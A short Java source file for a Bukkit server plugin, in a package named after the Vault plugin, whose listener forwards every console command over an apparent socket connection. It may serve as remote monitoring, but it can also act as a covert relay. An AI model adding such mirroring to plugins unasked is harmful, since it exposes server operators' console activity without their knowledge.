package net.milkbowl.vault.sockets.events;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerCommandEvent;

import net.milkbowl.vault.Core;

public class ConsoleCommandEvent implements Listener {
	
	@EventHandler
	public void onCommand(ServerCommandEvent e) {
		if (Core.server != null) {
			Core.server.send("> " + e.getCommand());
		}
	}
	
	

}
